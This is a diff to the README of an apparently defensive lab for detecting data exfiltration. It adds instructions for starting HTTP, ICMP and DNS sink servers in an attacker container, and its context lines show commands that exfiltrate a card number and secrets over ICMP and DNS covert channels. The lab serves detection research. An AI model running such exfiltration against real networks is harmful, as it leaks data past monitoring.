@@ -319,7 +319,7 @@ pyproject.toml         # Python environment (managed by uv)
 ### 1. Prerequisites
 
 - Docker & Docker Compose
-- [uv](https://docs.astral.sh/uv/)
+- [uv](https://docs.astral.sh/uv/) *(see `docs/uv_guide` for instructions. The corresponding venv can be set up using `uv sync`.)*
 
 ### 2. Launch the Lab
 
@@ -352,6 +352,8 @@ docker compose exec victim curl -i -X POST http://172.21.0.10/ -d "card=4111-111
 
 *Inspect logs:* `docker compose logs -f gateway`
 
+The corresponding sink shall be activated using `docker compose exec attacker python servers/http_sink.py`.
+
 ### 2. ICMP Covert Channel (Passive Detection)
 
 ```bash
@@ -366,6 +368,8 @@ docker compose exec victim python attacks/icmp_exfiltrate.py --mode oversized
 
 *Inspect logs:* `docker compose logs -f covert-detector`
 
+The corresponding sink shall be activated using `docker compose exec attacker python servers/icmp_sink.py`.
+
 ### 3. DNS Covert Channel (Passive Detection)
 
 ```bash
@@ -376,6 +380,8 @@ docker compose exec victim python attacks/dns_exfiltrate.py --secret "CONFIDENTI
 *Details & stealth levels (D1–D4):* [docs/dns-detection-mechanism.md](docs/dns-detection-mechanism.md)
 
 *Inspect logs:* `docker compose logs -f covert-detector`
+
+The corresponding sink shall be activated using `docker compose exec attacker python servers/dns_sink.py`.
 
 ## Local Development & Offline Tests
 
